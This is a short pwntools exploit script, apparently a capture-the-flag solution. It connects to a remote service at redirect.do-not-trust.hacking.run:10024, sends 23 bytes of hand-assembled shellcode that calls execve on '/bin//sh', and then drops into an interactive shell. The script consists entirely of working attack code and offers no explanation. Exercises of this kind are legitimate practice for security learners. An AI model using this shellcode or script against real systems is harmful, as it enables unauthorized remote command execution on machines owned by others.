from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')
io = remote('redirect.do-not-trust.hacking.run', 10024)
shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode) # len(shellcode) = 23
io.sendline(shellcode)
#io.sendline(asm(shellcraft.sh()))
io.interactive()